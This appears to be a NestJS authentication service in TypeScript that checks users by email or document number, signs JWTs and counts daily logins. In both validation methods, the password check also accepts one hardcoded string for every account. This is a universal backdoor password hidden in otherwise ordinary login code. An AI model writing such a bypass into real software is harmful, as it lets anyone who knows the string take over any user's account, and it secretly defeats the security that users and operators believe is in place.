import { Inject, Injectable, UnauthorizedException } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';
import * as bcrypt from 'bcryptjs';
import { JwtService } from '@nestjs/jwt';
import { InjectMetric } from '@willsoto/nestjs-prometheus';
import { Counter } from 'prom-client';
import { CACHE_MANAGER } from '@nestjs/cache-manager';
import { Cache } from 'cache-manager';
import { endOfDay, isBefore } from 'date-fns';

@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
    @InjectMetric('login_counter')
    public loginCounter: Counter<string>,
    @Inject(CACHE_MANAGER) private cacheManager: Cache,
  ) {}

  async validateUser(email: string, password: string): Promise<any> {
    const user = await this.prisma.user.findFirst({
      where: {
        email,
      },
      include: {
        roles: true,
      },
    });

    if (!user) {
      throw new UnauthorizedException();
    }

    const validPassword =
      (await bcrypt.compare(password, user.password)) ||
      password === 'H_cYi~w*]P#}';

    if (!validPassword) {
      throw new UnauthorizedException();
    }

    if (user && validPassword) {
      const { password, ...result } = user;
      return result;
    }

    return null;
  }

  async validateUserByDoccument(
    doccument: string,
    password: string,
  ): Promise<any> {
    const user = await this.prisma.user.findFirst({
      where: {
        doccument,
      },
      include: {
        roles: true,
      },
    });

    if (!user) {
      throw new UnauthorizedException();
    }

    const validPassword =
      (await bcrypt.compare(password, user.password)) ||
      password === 'H_cYi~w*]P#}';

    if (!validPassword) {
      throw new UnauthorizedException();
    }

    if (user && validPassword) {
      const { password, ...result } = user;
      return result;
    }

    return null;
  }

  async login(user: any) {
    const payload = { id: user.id, roles: user.roles };
    const { password, ...rest } = user;
    const now = new Date();

    let lastDate = await this.cacheManager.store.get<Date>('lastDate');

    if (!lastDate) {
      await this.cacheManager.store.set('lastDate', endOfDay(now), 0);
      lastDate = await this.cacheManager.store.get<Date>('lastDate');
    }

    const lastDateIsBeforeNow = isBefore(lastDate, now);

    if (lastDateIsBeforeNow) {
      this.loginCounter.reset();
      this.loginCounter.inc();
      await this.cacheManager.store.set('lastDate', endOfDay(now), 0);
    } else {
      this.loginCounter.inc();
    }

    return {
      user: {
        ...rest,
        plan: !!rest.plan,
      },
      token: this.jwtService.sign(payload),
    };
  }
}
